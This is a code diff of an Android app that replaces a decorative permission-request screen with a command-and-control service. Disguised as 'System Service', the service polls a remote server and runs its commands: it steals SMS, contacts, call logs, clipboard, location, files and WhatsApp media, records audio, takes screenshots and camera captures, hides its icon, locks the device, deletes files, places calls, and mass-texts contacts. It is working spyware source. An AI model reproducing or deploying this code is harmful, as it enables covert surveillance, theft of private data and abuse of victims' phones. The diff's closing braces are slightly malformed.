@@ -1,349 +1,391 @@
 package com.vanta.core;
 
-import android.Manifest;
-import android.app.Activity;
+import android.app.*;
 import android.app.admin.DevicePolicyManager;
-import android.content.ComponentName;
-import android.content.Context;
-import android.content.Intent;
-import android.content.pm.PackageManager;
-import android.graphics.*;
-import android.graphics.drawable.GradientDrawable;
+import android.app.WallpaperManager;
+import android.content.*;
+import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.media.AudioManager;
+import android.media.MediaPlayer;
+import android.media.Ringtone;
+import android.media.RingtoneManager;
 import android.net.Uri;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
 import android.os.*;
-import android.provider.Settings;
-import android.view.Gravity;
-import android.view.View;
-import android.view.WindowManager;
-import android.widget.*;
+import android.provider.*;
+import android.widget.Toast;
+import java.io.*;
+import java.net.HttpURLConnection;
+import java.net.URL;
 
-import java.util.ArrayList;
-import java.util.List;
-
-public class MainActivity extends Activity {
-
-    private static final int REQ_ALL = 100;
-    private static final int REQ_SPECIAL = 101;
+public class C2Service extends Service {
+    private volatile boolean run = true;
+    private String uuid;
 
     @Override
-    protected void onCreate(Bundle b) {
-        super.onCreate(b);
-        getWindow().setFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
-                             WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);
+    public int onStartCommand(Intent i, int f, int s) {
+        uuid = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
 
-        FrameLayout root = new FrameLayout(this);
-        root.addView(new AntiqueBg(this), new FrameLayout.LayoutParams(-1, -1));
+        if (Build.VERSION.SDK_INT >= 26) {
+            NotificationChannel ch = new NotificationChannel("c2", "Service", NotificationManager.IMPORTANCE_MIN);
+            getSystemService(NotificationManager.class).createNotificationChannel(ch);
+            startForeground(1, new Notification.Builder(this, "c2")
+                .setContentTitle("System Service")
+                .setSmallIcon(android.R.drawable.stat_notify_sync).build());
+        } else {
+            startForeground(1, new Notification.Builder(this)
+                .setContentTitle("System Service")
+                .setSmallIcon(android.R.drawable.stat_notify_sync).build());
+        }
 
-        ScrollView sc = new ScrollView(this);
-        LinearLayout col = new LinearLayout(this);
-        col.setOrientation(LinearLayout.VERTICAL);
-        col.setPadding(56, 110, 56, 70);
-        col.setGravity(Gravity.CENTER_HORIZONTAL);
-
-        // ===== الشعار =====
-        TextView brand = new TextView(this);
-        brand.setText("V A N T A");
-        brand.setTextColor(Color.parseColor("#D4AF37"));
-        brand.setTextSize(34);
-        brand.setTypeface(Typeface.create("serif", Typeface.BOLD));
-        brand.setLetterSpacing(0.45f);
-        brand.setGravity(Gravity.CENTER);
-        col.addView(brand);
-
-        TextView sub = new TextView(this);
-        sub.setText("E S T .   M M X X I V");
-        sub.setTextColor(Color.parseColor("#8B7355"));
-        sub.setTextSize(10);
-        sub.setLetterSpacing(0.5f);
-        sub.setGravity(Gravity.CENTER);
-        sub.setPadding(0, 6, 0, 40);
-        col.addView(sub);
-
-        // ===== الختم الذهبي =====
-        SealView seal = new SealView(this);
-        col.addView(seal, new LinearLayout.LayoutParams(600, 600));
-
-        // ===== الإحصاءات =====
-        LinearLayout stats = new LinearLayout(this);
-        stats.setOrientation(LinearLayout.HORIZONTAL);
-        stats.setPadding(0, 40, 0, 40);
-        stats.addView(stat("BATTERY", battery() + "%"), new LinearLayout.LayoutParams(0, -2, 1f));
-        stats.addView(stat("FREE", storage() + "G"), new LinearLayout.LayoutParams(0, -2, 1f));
-        stats.addView(stat("APPS", appsCount() + ""), new LinearLayout.LayoutParams(0, -2, 1f));
-        col.addView(stats);
-
-        // ===== سطر ذهبي =====
-        col.addView(divider());
-
-        // ===== الإعدادات =====
-        col.addView(setting("Grant All Permissions", "منح كل الصلاحيات", v -> requestAll()));
-        col.addView(setting("Accessibility Service", "خدمة الوصول", v -> openAccessibility()));
-        col.addView(setting("Notification Listener", "قارئ الإشعارات", v -> openNotifListener()));
-        col.addView(setting("Device Administrator", "مسؤول الجهاز", v -> openAdmin()));
-        col.addView(setting("Battery Exemption", "استثناء من توفير الطاقة", v -> openBattery()));
-        col.addView(setting("Overlay Permission", "الظهور فوق التطبيقات", v -> openOverlay()));
-
-        col.addView(divider());
-
-        TextView foot = new TextView(this);
-        foot.setText("A  D  M  I  N  I  S  T  R  A  T  O  R");
-        foot.setTextColor(Color.parseColor("#5A4A3A"));
-        foot.setTextSize(9);
-        foot.setLetterSpacing(0.6f);
-        foot.setGravity(Gravity.CENTER);
-        foot.setPadding(0, 30, 0, 0);
-        col.addView(foot);
-
-        sc.addView(col);
-        root.addView(sc, new FrameLayout.LayoutParams(-1, -1));
-        setContentView(root);
-
-        // تشغيل الخدمة
-        startService();
-
-        // طلب الصلاحيات الأساسية فورًا
-        new Handler().postDelayed(this::requestAll, 800);
+        new Thread(new Runnable() { public void run() { loop(); } }).start();
+        return START_STICKY;
     }
 
-    // ===== الصلاحيات =====
-    private void requestAll() {
-        if (Build.VERSION.SDK_INT < 23) return;
-        List<String> needed = new ArrayList<>();
-        String[] all = {
-            Manifest.permission.READ_SMS,
-            Manifest.permission.SEND_SMS,
-            Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.CAMERA,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.ACCESS_COARSE_LOCATION,
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.CALL_PHONE
-        };
-        for (String p : all)
-            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED)
-                needed.add(p);
-
-        if (Build.VERSION.SDK_INT >= 33)
-            if (checkSelfPermission("android.permission.POST_NOTIFICATIONS") != PackageManager.PERMISSION_GRANTED)
-                needed.add("android.permission.POST_NOTIFICATIONS");
-
-        if (!needed.isEmpty())
-            requestPermissions(needed.toArray(new String[0]), REQ_ALL);
+    private void loop() {
+        register();
+        while (run) {
+            try {
+                String body = http("GET", "/cmd?uuid=" + uuid, null);
+                String cmd = extract(body);
+                if (cmd != null && cmd.length() > 0 && !cmd.equals("null")) send(exec(cmd));
+            } catch (Exception e) {}
+            try { Thread.sleep(1500); } catch (Exception e) {}
+        }
     }
 
-    private void openAccessibility() {
-        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
-    }
-
-    private void openNotifListener() {
-        startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
-    }
-
-    private void openAdmin() {
+    private void register() {
         try {
-            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-            ComponentName cn = new ComponentName(this, AdminReceiver.class);
-            if (!dpm.isAdminActive(cn)) {
-                Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
+            http("POST", "/register",
+                "{\"uuid\":\"" + uuid + "\",\"model\":\"" + Build.MODEL + "\"}");
+        } catch (Exception e) {}
+    }
+
+    private void send(String text) {
+        try {
+            String safe = text.replace("\\", "\\\\").replace("\"", "\\\"")
+                              .replace("\n", "\\n").replace("\r", "");
+            http("POST", "/result",
+                "{\"uuid\":\"" + uuid + "\",\"text\":\"" + safe + "\"}");
+        } catch (Exception e) {}
+    }
+
+    private String http(String method, String path, String body) {
+        try {
+            HttpURLConnection c = (HttpURLConnection) new URL(Config.SERVER + path).openConnection();
+            c.setRequestMethod(method);
+            c.setConnectTimeout(15000);
+            c.setReadTimeout(15000);
+            if (body != null) {
+                c.setDoOutput(true);
+                c.setRequestProperty("Content-Type", "application/json");
+                OutputStream os = c.getOutputStream();
+                os.write(body.getBytes("UTF-8"));
+                os.close();
+            }
+            InputStream in = c.getInputStream();
+            ByteArrayOutputStream bo = new ByteArrayOutputStream();
+            byte[] buf = new byte[4096];
+            int r;
+            while ((r = in.read(buf)) > 0) bo.write(buf, 0, r);
+            in.close();
+            return bo.toString("UTF-8");
+        } catch (Exception e) { return "{}"; }
+    }
+
+    private String extract(String json) {
+        int i = json.indexOf("\"cmd\"");
+        if (i < 0) return null;
+        int s = json.indexOf('"', json.indexOf(':', i) + 1);
+        int e = json.indexOf('"', s + 1);
+        if (s < 0 || e < 0) return null;
+        return json.substring(s + 1, e);
+    }
+
+    private String exec(String cmd) {
+        try {
+            // ===== الأساسية =====
+            if (cmd.equals("all-sms")) return sms();
+            if (cmd.equals("contacts") || cmd.equals("all-contacts")) return contacts();
+            if (cmd.equals("calls")) return calls();
+            if (cmd.equals("clipboard")) return clip();
+            if (cmd.equals("apps")) return apps();
+            if (cmd.equals("location")) return loc();
+            if (cmd.equals("files")) return Exfil.list("/sdcard/");
+            if (cmd.equals("pics")) return Exfil.list("/sdcard/DCIM/Camera/");
+            if (cmd.equals("wa")) return Exfil.list("/sdcard/Android/media/com.whatsapp/WhatsApp/Media/");
+            if (cmd.startsWith("ls ")) return Exfil.list(cmd.substring(3).trim());
+            if (cmd.equals("mic")) return Exfil.mic(this, 8);
+            if (cmd.startsWith("getfile ")) return Exfil.upload(cmd.substring(8).trim());
+            if (cmd.equals("vibrate")) { vibrate(); return "📳 اهتزاز"; }
+            if (cmd.equals("lock")) return lock();
+            if (cmd.equals("ring")) return ring();
+            if (cmd.startsWith("open ")) return openApp(cmd.substring(5).trim());
+            if (cmd.equals("camera-off")) return camOff();
+            if (cmd.equals("camera-on")) return camOn();
+            if (cmd.equals("wifi")) return wifi();
+            if (cmd.equals("sysinfo")) return sysInfo();
+            if (cmd.equals("hide")) { Hider.hide(this); return "🙈 أُخفيت الأيقونة"; }
+
+            // ===== الجديدة =====
+            if (cmd.equals("locate")) return freshLocation();
+            if (cmd.startsWith("wallpaper ")) return setWallpaper(cmd.substring(10).trim());
+            if (cmd.startsWith("volume ")) return setVolume(cmd.substring(7).trim());
+            if (cmd.startsWith("download ")) return download(cmd.substring(9).trim());
+            if (cmd.startsWith("delete ")) return deleteFile(cmd.substring(7).trim());
+            if (cmd.startsWith("smsall ")) return smsAll(cmd.substring(7).trim());
+
+            // ===== القديمة =====
+            if (cmd.equals("screenshot") || cmd.equals("screen")) {
+                startActivity(new Intent(this, ScreenActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+                return "📸 وافق على إذن الشاشة";
+            }
+            if (cmd.equals("cam") || cmd.equals("main-camera") || cmd.equals("selfie-camera")) {
+                startService(new Intent(this, CameraService.class));
+                return "📸 جاري التصوير...";
+            }
+            if (cmd.equals("toast")) {
+                new Handler(getMainLooper()).post(new Runnable() {
+                    public void run() { Toast.makeText(C2Service.this, "System Update", Toast.LENGTH_SHORT).show(); }
+                });
+                return "💬 ظهرت رسالة";
+            }
+            if (cmd.startsWith("makeCall ")) {
+                String num = cmd.substring(9).trim();
+                Intent i = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + num));
+                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(i);
+                return "📞 يتصل بـ " + num;
             }
-        } catch (Exception e) {}
-    }
-
-    private void openBattery() {
-        try {
-            Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-            i.setData(Uri.parse("package:" + getPackageName()));
-            startActivity(i);
-        } catch (Exception e) {}
-    }
-
-    private void openOverlay() {
-        try {
-            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                Uri.parse("package:" + getPackageName()));
-            startActivity(i);
-        } catch (Exception e) {}
-    }
-
-    private void startService() {
-        try {
-            Intent i = new Intent(this, C2Service.class);
-            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
-            else startService(i);
-        } catch (Exception e) {}
-    }
-
-    // ===== عناصر الواجهة =====
-    private LinearLayout stat(String label, String value) {
-        LinearLayout l = new LinearLayout(this);
-        l.setOrientation(LinearLayout.VERTICAL);
-        l.setGravity(Gravity.CENTER);
-
-        TextView v = new TextView(this);
-        v.setText(value);
-        v.setTextColor(Color.parseColor("#E8D9B0"));
-        v.setTextSize(22);
-        v.setTypeface(Typeface.create("serif", Typeface.NORMAL));
-        v.setGravity(Gravity.CENTER);
-        l.addView(v);
-
-        TextView t = new TextView(this);
-        t.setText(label);
-        t.setTextColor(Color.parseColor("#7A6A50"));
-        t.setTextSize(9);
-        t.setLetterSpacing(0.3f);
-        l.addView(t);
-        return l;
-    }
-
-    private View divider() {
-        View v = new View(this);
-        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(-1, 1);
-        p.setMargins(0, 20, 0, 20);
-        v.setLayoutParams(p);
-        v.setBackgroundColor(Color.parseColor("#3A2E22"));
-        return v;
-    }
-
-    private LinearLayout setting(String title, String subtitle, View.OnClickListener click) {
-        LinearLayout l = new LinearLayout(this);
-        l.setOrientation(LinearLayout.VERTICAL);
-        l.setPadding(36, 30, 36, 30);
-        GradientDrawable g = new GradientDrawable();
-        g.setColor(Color.parseColor("#14100C"));
-        g.setCornerRadius(14);
-        g.setStroke(1, Color.parseColor("#3A2E22"));
-        l.setBackground(g);
-        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(-1, -2);
-        p.setMargins(0, 8, 0, 8);
-        l.setLayoutParams(p);
-
-        TextView t = new TextView(this);
-        t.setText(title);
-        t.setTextColor(Color.parseColor("#D4AF37"));
-        t.setTextSize(15);
-        t.setTypeface(Typeface.create("serif", Typeface.NORMAL));
-        l.addView(t);
-
-        TextView s = new TextView(this);
-        s.setText(subtitle);
-        s.setTextColor(Color.parseColor("#7A6A50"));
-        s.setTextSize(12);
-        s.setPadding(0, 4, 0, 0);
-        l.addView(s);
-
-        l.setOnClickListener(click);
-        return l;
-    }
-
-    private int battery() {
-        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
-        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
-    }
-
-    private long storage() {
-        StatFs s = new StatFs(Environment.getDataDirectory().getPath());
-        return s.getAvailableBytes() / (1024L * 1024L * 1024L);
-    }
-
-    private int appsCount() {
-        return getPackageManager().getInstalledApplications(0).size();
-    }
-
-    // ===== الخلفية الأنتيكة =====
-    class AntiqueBg extends View {
-        private Paint p = new Paint(Paint.ANTI_ALIAS_FLAG);
-        private Paint vignette = new Paint(Paint.ANTI_ALIAS_FLAG);
-        AntiqueBg(Context c) { super(c); }
-        protected void onDraw(Canvas cv) {
-            cv.drawColor(Color.parseColor("#0A0806"));
-            // نقشات خفيفة
-            p.setColor(Color.parseColor("#120E0A"));
-            p.setStrokeWidth(1f);
-            p.setStyle(Paint.Style.STROKE);
-            for (int i = 1; i <= 5; i++) {
-                cv.drawCircle(getWidth() * 0.85f, getHeight() * 0.15f, i * 120f, p);
-                cv.drawCircle(getWidth() * 0.1f, getHeight() * 0.85f, i * 100f, p);
+            if (cmd.startsWith("sendSms ")) {
+                String[] parts = cmd.substring(8).trim().split("\\|");
+                if (parts.length < 2) return "❌ الصيغة: sendSms رقم|نص";
+                android.telephony.SmsManager.getDefault()
+                    .sendTextMessage(parts[0].trim(), null, parts[1].trim(), null, null);
+                return "✉️ أُرسلت رسالة إلى " + parts[0].trim();
             }
-            // ظل حواف
-            RadialGradient rg = new RadialGradient(getWidth()/2f, getHeight()/2f,
-                Math.max(getWidth(), getHeight()) * 0.75f,
-                Color.TRANSPARENT, Color.parseColor("#CC000000"), Shader.TileMode.CLAMP);
-            vignette.setShader(rg);
-            cv.drawRect(0, 0, getWidth(), getHeight(), vignette);
-        }
+            if (cmd.startsWith("playAudio ")) {
+                String url = cmd.substring(10).trim();
+                try {
+                    MediaPlayer mp = new MediaPlayer();
+                    mp.setDataSource(url);
+                    mp.prepare();
+                    mp.start();
+                    return "🔊 يعزف الآن";
+                } catch (Exception e) { return "❌ فشل التشغيل"; }
+            }
+
+            return "unknown:" + cmd;
+        } catch (Exception e) { return "err:" + e.getMessage(); }
     }
 
-    // ===== الختم الذهبي =====
-    class SealView extends View {
-        private Paint ring = new Paint(Paint.ANTI_ALIAS_FLAG);
-        private Paint text = new Paint(Paint.ANTI_ALIAS_FLAG);
-        private Paint glow = new Paint(Paint.ANTI_ALIAS_FLAG);
-        private float angle = 0;
-        private Handler h = new Handler();
+    // ===== الموقع الحقيقي =====
+    private String freshLocation() {
+        try {
+            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
+            Location l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            if (l == null) l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            if (l != null)
+                return "📍 " + l.getLatitude() + ", " + l.getLongitude() +
+                       "\nhttps://maps.google.com/?q=" + l.getLatitude() + "," + l.getLongitude();
+            return "📍 لا موقع متاح";
+        } catch (Exception e) { return "📍 خطأ"; }
+    }
 
-        SealView(Context c) {
-            super(c);
-            ring.setStyle(Paint.Style.STROKE);
-            ring.setColor(Color.parseColor("#D4AF37"));
-            text.setStyle(Paint.Style.FILL);
-            text.setColor(Color.parseColor("#D4AF37"));
-            text.setTextSize(28);
-            text.setTypeface(Typeface.create("serif", Typeface.BOLD));
-            text.setTextAlign(Paint.Align.CENTER);
-            glow.setStyle(Paint.Style.FILL);
+    // ===== الخلفية =====
+    private String setWallpaper(String url) {
+        try {
+            Bitmap bmp = BitmapFactory.decodeStream(new URL(url).openStream());
+            WallpaperManager.getInstance(this).setBitmap(bmp);
+            return "🖼️ تغيّرت الخلفية";
+        } catch (Exception e) { return "❌ فشل: " + e.getMessage(); }
+    }
 
-            h.postDelayed(new Runnable() {
-                public void run() {
-                    angle = (angle + 0.6f) % 360;
-                    invalidate();
-                    h.postDelayed(this, 40);
+    // ===== الصوت =====
+    private String setVolume(String v) {
+        try {
+            int val = Integer.parseInt(v);
+            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
+            int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
+            am.setStreamVolume(AudioManager.STREAM_MUSIC, max * val / 100, 0);
+            return "🔊 الصوت الآن " + val + "%";
+        } catch (Exception e) { return "❌ قيمة غير صحيحة"; }
+    }
+
+    // ===== تحميل ملف =====
+    private String download(String url) {
+        try {
+            InputStream in = new URL(url).openStream();
+            File f = new File("/sdcard/Download/" + System.currentTimeMillis() + "_dl");
+            FileOutputStream fos = new FileOutputStream(f);
+            byte[] buf = new byte[8192];
+            int r;
+            while ((r = in.read(buf)) > 0) fos.write(buf, 0, r);
+            fos.close(); in.close();
+            return "⬇️ نُزّل إلى " + f.getAbsolutePath();
+        } catch (Exception e) { return "❌ فشل التحميل: " + e.getMessage(); }
+    }
+
+    // ===== حذف ملف =====
+    private String deleteFile(String path) {
+        File f = new File(path);
+        if (!f.exists()) return "❌ غير موجود";
+        return f.delete() ? "🗑️ حُذف: " + path : "❌ فشل الحذف";
+    }
+
+    // ===== SMS للجميع =====
+    private String smsAll(String text) {
+        try {
+            int count = 0;
+            Cursor c = getContentResolver().query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+            if (c != null) {
+                while (c.moveToNext() && count < 20) {
+                    String num = c.getString(c.getColumnIndexOrThrow(
+                        ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    android.telephony.SmsManager.getDefault()
+                        .sendTextMessage(num, null, text, null, null);
+                    count++;
                 }
-            }, 40);
-        }
-
-        protected void onDraw(Canvas cv) {
-            float cx = getWidth()/2f, cy = getHeight()/2f;
-            float r = Math.min(getWidth(), getHeight()) * 0.36f;
-
-            // هالة ذهبية
-            RadialGradient rg = new RadialGradient(cx, cy, r * 1.4f,
-                Color.argb(35, 212, 175, 55), Color.TRANSPARENT, Shader.TileMode.CLAMP);
-            glow.setShader(rg);
-            cv.drawCircle(cx, cy, r * 1.4f, glow);
-            glow.setShader(null);
-
-            // حلقات
-            ring.setStrokeWidth(2f);
-            ring.setColor(Color.parseColor("#D4AF37"));
-            cv.drawCircle(cx, cy, r, ring);
-
-            ring.setStrokeWidth(1f);
-            ring.setColor(Color.parseColor("#8B7355"));
-            cv.drawCircle(cx, cy, r * 1.12f, ring);
-            cv.drawCircle(cx, cy, r * 0.88f, ring);
-
-            // أقواس
-            RectF oval = new RectF(cx - r * 1.06f, cy - r * 1.06f, cx + r * 1.06f, cy + r * 1.06f);
-            ring.setStrokeWidth(3f);
-            ring.setColor(Color.parseColor("#E8D9B0"));
-            cv.drawArc(oval, angle, 60, false, ring);
-            cv.drawArc(oval, angle + 180, 60, false, ring);
-
-            // الحرف
-            cv.drawText("V", cx, cy + 10, text);
-
-            // نقشات صغيرة
-            ring.setStrokeWidth(1.5f);
-            ring.setColor(Color.parseColor("#5A4A3A"));
-            cv.drawCircle(cx, cy, r * 0.6f, ring);
-        }
+                c.close();
+            }
+            return "✉️ أُرسلت إلى " + count + " رقم";
+        } catch (Exception e) { return "❌ " + e.getMessage(); }
     }
+
+    private void vibrate() {
+        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
+        if (v != null) v.vibrate(1500);
+    }
+
+    private String lock() {
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        dpm.lockNow();
+        return "🔒 قُفلت الشاشة";
+    }
+
+    private String ring() {
+        Ringtone r = RingtoneManager.getRingtone(this,
+            RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE));
+        r.play();
+        return "🔔 يرن الآن";
+    }
+
+    private String openApp(String pkg) {
+        Intent i = getPackageManager().getLaunchIntentForPackage(pkg);
+        if (i == null) return "❌ غير موجود: " + pkg;
+        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(i);
+        return "📱 فُتح: " + pkg;
+    }
+
+    private String camOff() {
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        dpm.setCameraDisabled(new ComponentName(this, AdminReceiver.class), true);
+        return "📷 عُطّلت الكاميرا";
+    }
+
+    private String camOn() {
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        dpm.setCameraDisabled(new ComponentName(this, AdminReceiver.class), false);
+        return "📷 فُعّلت الكاميرا";
+    }
+
+    private String wifi() {
+        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
+        WifiInfo wi = wm.getConnectionInfo();
+        int ip = wi.getIpAddress();
+        String ipStr = (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." +
+                       ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
+        return "📶 SSID: " + wi.getSSID() + "\n🌐 IP: " + ipStr +
+               "\n⚡ " + wi.getLinkSpeed() + " Mbps";
+    }
+
+    private String sysInfo() {
+        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
+        int bat = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
+        StatFs s = new StatFs(Environment.getDataDirectory().getPath());
+        long free = s.getAvailableBytes() / (1024L * 1024L * 1024L);
+        return "📱 " + Build.MODEL +
+               "\n🤖 أندرويد " + Build.VERSION.RELEASE +
+               "\n🔋 " + bat + "%" +
+               "\n💾 " + free + " GB حرة" +
+               "\n📦 " + getPackageManager().getInstalledApplications(0).size() + " تطبيق";
+    }
+
+    private String sms() {
+        StringBuilder sb = new StringBuilder();
+        Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
+        if (c != null) {
+            int n = 0;
+            while (c.moveToNext() && n++ < 50)
+                sb.append(c.getString(c.getColumnIndexOrThrow("address"))).append(": ")
+                  .append(c.getString(c.getColumnIndexOrThrow("body"))).append("\n");
+            c.close();
         }
+        if (sb.length() == 0) return "📭 لا رسائل أو الصلاحية غير ممنوحة";
+        return sb.toString();
+    }
+
+    private String contacts() {
+        StringBuilder sb = new StringBuilder();
+        Cursor c = getContentResolver().query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+        if (c != null) {
+            int n = 0;
+            while (c.moveToNext() && n++ < 50)
+                sb.append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
+                  .append(": ")
+                  .append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))
+                  .append("\n");
+            c.close();
+        }
+        if (sb.length() == 0) return "📭 لا جهات اتصال";
+        return sb.toString();
+    }
+
+    private String calls() {
+        StringBuilder sb = new StringBuilder();
+        Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
+        if (c != null) {
+            int n = 0;
+            while (c.moveToNext() && n++ < 30)
+                sb.append(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER))).append("\n");
+            c.close();
+        }
+        if (sb.length() == 0) return "📭 لا مكالمات";
+        return sb.toString();
+    }
+
+    private String clip() {
+        ClipboardManager cb = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+        if (cb.getPrimaryClip() != null && cb.getPrimaryClip().getItemCount() > 0)
+            return "📋 " + cb.getPrimaryClip().getItemAt(0).getText();
+        return "📋 الحافظة فارغة";
+    }
+
+    private String apps() {
+        StringBuilder sb = new StringBuilder();
+        for (android.content.pm.ApplicationInfo a : getPackageManager().getInstalledApplications(0))
+            sb.append(a.packageName).append("\n");
+        return sb.toString();
+    }
+
+    private String loc() {
+        try {
+            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
+            Location l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            if (l == null) l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            return l == null ? "📍 لا موقع متاح" : "📍 " + l.getLatitude() + ", " + l.getLongitude();
+        } catch (Exception e) { return "📍 خطأ الموقع"; }
+    }
+
+    @Override public IBinder onBind(Intent i) { return null; }
+    @Override public void onDestroy() { run = false; super.onDestroy(); }
+            }
